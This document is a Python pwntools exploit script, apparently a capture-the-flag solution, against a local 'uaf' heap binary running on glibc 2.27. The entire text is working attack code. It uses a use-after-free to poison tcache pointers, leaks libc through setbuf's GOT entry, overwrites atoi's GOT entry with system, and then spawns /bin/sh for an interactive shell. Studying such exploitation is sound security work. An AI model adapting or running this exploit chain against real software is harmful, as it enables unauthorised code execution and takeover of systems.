#!/usr/bin/env python3 
from pwn import *

def create(r, content):
    info(f"Creating chunk with contents {content}")
    r.recvuntil(b"5. Exit")
    r.sendline(b"1")
    r.recvline()
    r.send(content)
    r.recvline()

def edit(r, index, content):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"3")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvline()
    r.send(content)


def delete(r, index):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"4")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvline()

def view(r, index):
    r.recvuntil(b"5. Exit\n")
    r.sendline(b"2")
    r.recvline()
    r.sendline(str(index).encode())
    r.recvuntil(b"Your rule: ")
    return r.recvuntil(b"---Choose your option:---").split(b"---")[0]

r = process(["./ld-2.27.so", "./uaf"], env={"LD_PRELOAD":"./libc.so.6"})

e = ELF("./uaf")

# create chunks for arb_read
create(r, b"AAAAAAAA")
create(r, b"BBBBBBBB")

# create chunks for arb_write
create(r, b"CCCCCCCC")
create(r, b"DDDDDDDD")

# perform arb_read 
delete(r, 1)
delete(r, 0)
edit(r, 0, p64(e.got['setbuf'])) # this will corrupt the next pointer

create(r, b"A") # create rule 0
create(r, b"B") # create rule 1

# leak libc
libc = ELF("./libc.so.6")
libc_leak = u64(view(r, 1).strip().ljust(8, b"\x00"))
info(f"libc_leak: {hex(libc_leak)}")

libc_base = libc_leak - 0x88542
info(f"libc_base: {hex(libc_base)}")

libc_system = libc_base + libc.symbols['system']
info(f"libc_system: {hex(libc_system)}")

# perform arb_write
delete(r, 3)
delete(r, 2)

edit(r, 2, p64(e.got['atoi']))

create(r, b"A")
create(r, p64(libc_system))

r.sendafter(b"Exit\n", b"/bin/sh")

# got shell
r.interactive()
